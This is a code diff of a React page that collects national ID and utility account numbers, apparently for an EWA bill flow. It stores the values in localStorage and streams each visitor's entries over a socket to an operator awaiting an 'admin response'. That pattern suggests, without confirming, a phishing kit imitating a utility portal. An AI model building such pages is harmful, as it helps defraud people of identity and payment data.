@@ -68,11 +68,35 @@ export default function HomePage() {
     if (!idType || !idNumber || !accountNumber) return;
     setIsSubmitting(true);
 
-    const idTypeLabel = 
-      idType === 'bahraini' ? 'الرقم الشخصي البحريني' :
-      idType === 'emirati' ? 'الرقم الشخصي الإماراتي' :
-      idType === 'saudi' ? 'الرقم الشخصي السعودي' :
-      idType === 'omani' ? 'الرقم الشخصي العماني' : idType;
+    const idTypeMap: Record<string, string> = {
+      'bahraini': 'الرقم الشخصي البحريني',
+      'emirati': 'الرقم الشخصي الإماراتي',
+      'saudi': 'الرقم الشخصي السعودي',
+      'omani': 'الرقم الشخصي العماني',
+      'qatari': 'الرقم الشخصي القطري',
+      'kuwaiti': 'الرقم الشخصي الكويتي',
+      'owners_union': 'رقم اتحاد الملاك',
+      'gov_entity': 'رقم الجهة الحكومية',
+      'passport': 'رقم الجواز',
+      'commercial_reg': 'رقم السجل التجاري',
+      'establishment': 'رقم المنشأة',
+    };
+    const idTypeLabel = idTypeMap[idType] || idType;
+
+    // Map to server-side codes
+    const idTypeServerMap: Record<string, string> = {
+      'bahraini': 'BH', 'emirati': 'AE', 'saudi': 'SA', 'omani': 'OM',
+      'qatari': 'QA', 'kuwaiti': 'KW', 'owners_union': 'UNION',
+      'gov_entity': 'GOV', 'passport': 'PASSPORT', 'commercial_reg': 'CR',
+      'establishment': 'FACILITY',
+    };
+    const idTypeCode = idTypeServerMap[idType] || idType;
+
+    // Save data to localStorage for EWABills page
+    localStorage.setItem('ewa_idType', idTypeCode);
+    localStorage.setItem('ewa_idNumber', idNumber);
+    localStorage.setItem('ewa_accountNumber', accountNumber);
+    localStorage.setItem('ewa_idTypeLabel', idTypeLabel);
 
     if (socket.value.connected) {
       socket.value.emit('visitor:updateName', idNumber);
@@ -85,13 +109,13 @@ export default function HomePage() {
         accountNumber,
       },
       current: 'الصفحة الرئيسية',
-      nextPage: 'summary-payment',
+      nextPage: 'ewa-bills',
       waitingForAdminResponse: false,
     });
 
     setTimeout(() => {
       setIsSubmitting(false);
-      setLocation('/summary-payment');
+      setLocation('/ewa-bills');
     }, 1000);
   };
 
